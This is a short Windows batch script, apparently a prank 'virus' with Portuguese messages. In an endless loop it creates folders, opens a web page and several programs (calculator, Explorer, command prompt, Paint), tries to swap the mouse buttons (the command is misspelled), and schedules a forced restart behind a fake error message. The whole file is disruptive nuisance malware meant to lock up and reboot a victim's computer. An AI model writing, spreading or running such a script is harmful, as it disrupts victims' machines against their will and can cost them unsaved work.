@echo off
:loop
msg * ??? passou por aqui.
md virus
md %random%
start https://www.google.com/juuj
runddll32 user32 , SwapMouseButton
start calc
start explorer
start cmd
start mspaint
shutdown -r -t 30 -c "occoreu um erro."
goto loop
